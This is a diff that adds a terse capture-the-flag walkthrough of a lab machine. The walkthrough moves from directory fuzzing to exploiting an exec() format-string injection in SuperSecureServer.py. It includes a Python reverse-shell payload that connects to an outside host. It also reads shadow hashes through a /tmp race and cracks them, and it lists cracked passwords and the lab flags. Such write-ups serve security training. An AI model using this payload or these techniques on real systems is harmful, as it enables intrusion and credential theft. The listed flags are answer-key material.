@@ -1,0 +1,27 @@
+Port 8080 and ssh opened. 
+
+From the website we get that we have a file called 'SuperSecureServer.py'
+If we run dirb or wfuzz we get nothing, only 404 so let's try to wfuzz with this file [ wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/big.txt --hw 14 http://10.10.10.168:8080/FUZZ/SuperSecureServer.py ]
+And we get their developer directory :D [ /develop/ ] 
+Looking into the SuperSecServ file we got this interesting comment 'exec(info.format(path)) # This is how you do string formatting, right?'
+Now we inject the shell using some specific addons. [ test'; import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.47",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash");'test ]
+And we need to encode it using burp and we got a low priv shell
+We see an interesting file, check.txt,out.txt, passwordreminder.txt.
+Get the key by passing out.txt as input and check.txt as key [ python3 SuperSecureCrypto.py -i out.txt -k "Encrypting this file with your key should result in out.txt, make sure your key is correct!" -o key.txt -d ] 
+Now let's decrypt the password. [ python3 SuperSecureCrypto.py -i passwordreminder.txt -k "alexandrovich" -o pass.decrypted -d ] 
+And we got the user! 
+
+Heading to root.
+We found the file BetterSSH and now we try to understand the code.
+Write a script that reads that file, or use [ watch -n 0.0001 cat /tmp/SSH/* >> shadow.txt ]
+Crack the hash [ john --wordlist=/usr/share/wordlists/rockyou.txt hash.encrypted ]
+And we got root. 
+
+Users:
+-> alexandrovich
+-> robert:SecThruObsFTW
+-> root:mercedes
+
+Flags:
+-> USER: e4493782066b55fe2755708736ada2d7
+-> ROOT: 512fd4429f33a113a44d5acde23609e3
